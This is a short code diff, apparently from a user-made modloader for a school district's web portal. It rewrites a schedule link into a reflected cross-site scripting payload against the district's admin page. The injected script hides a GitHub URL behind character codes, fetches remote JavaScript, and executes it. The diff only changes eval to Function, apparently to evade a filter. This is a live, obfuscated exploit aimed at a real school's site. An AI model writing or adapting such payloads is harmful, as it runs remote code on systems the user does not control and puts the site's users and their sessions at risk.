@@ -147,7 +147,7 @@ document.loadStylesheet = loadStylesheet;
 
 //edit schedule override allowing it to work normally when modloaded
 if(document.querySelector('a[title="Edit your personal schedule"]')) {
-  document.querySelector('a[title="Edit your personal schedule"]').href = `https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Cscript%3Efetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,101,116,83,99,104,101,100,117,108,101,46,106,115)).then(response=%3Eresponse.text()).then(d=%3Eeval(d))%3C/script%3E`;
+  document.querySelector('a[title="Edit your personal schedule"]').href = `https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Cscript%3Efetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,101,116,83,99,104,101,100,117,108,101,46,106,115)).then(response=%3Eresponse.text()).then(d=%3E(Function(d))())%3C/script%3E`;
 }
 
 function renderObject(object) {
